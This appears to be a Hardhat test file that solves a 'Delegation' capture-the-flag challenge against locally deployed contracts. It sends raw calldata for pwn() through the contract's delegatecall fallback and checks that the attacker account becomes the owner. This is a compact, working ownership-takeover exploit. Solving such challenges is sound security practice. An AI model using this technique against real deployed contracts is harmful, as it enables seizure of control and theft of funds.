import { loadFixture, ethers, expect } from "./setup";

describe("Delegation", function() {

    async function deploy() {
        const [ deployer, signer ] = await ethers.getSigners();
        
        const delegateFactory = await ethers.getContractFactory("Delegate");
        const delegate = await delegateFactory.deploy(deployer.address);
        await delegate.waitForDeployment();
    
        const delegationFactory = await ethers.getContractFactory("Delegation");
        const delegation = await delegationFactory.deploy(delegate.target);
        await delegation.waitForDeployment();

        return { delegation, signer }
    }

    it("Solve the challenge", async function() {
        const { delegation, signer } = await loadFixture(deploy);

        const iface = new ethers.Interface(["function pwn()"]);
        const data = iface.encodeFunctionData("pwn");

        const owner1 = await delegation.owner();

        const tx = await signer.sendTransaction({
            to: delegation.target,
            data
        });
        await tx.wait();

        const owner = await delegation.owner();
        expect(owner).to.be.eq(signer.address);
    });

});